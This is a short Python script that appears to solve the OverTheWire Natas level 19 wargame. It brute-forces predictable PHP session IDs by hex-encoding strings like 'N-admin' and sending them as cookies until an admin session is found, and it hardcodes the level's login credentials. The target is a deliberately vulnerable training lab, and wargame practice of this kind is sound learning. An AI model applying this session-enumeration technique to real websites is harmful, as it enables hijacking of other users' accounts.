import requests
from requests.auth import HTTPBasicAuth

Auth = HTTPBasicAuth("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")

for _i in range(640):
    ses = str(_i)+"-admin"
    session = ses.encode("utf-8").hex()
    r = requests.post("http://natas19.natas.labs.overthewire.org/index.php?debug", auth=Auth, 
                    cookies={"PHPSESSID": session}, headers={"Content-Type":"application/x-www-form-urlencoded"}, data={"username":"admin", "password":"admin"})
    if not "regular" in r.text:
        print("found: ", session)
        break
    print(session)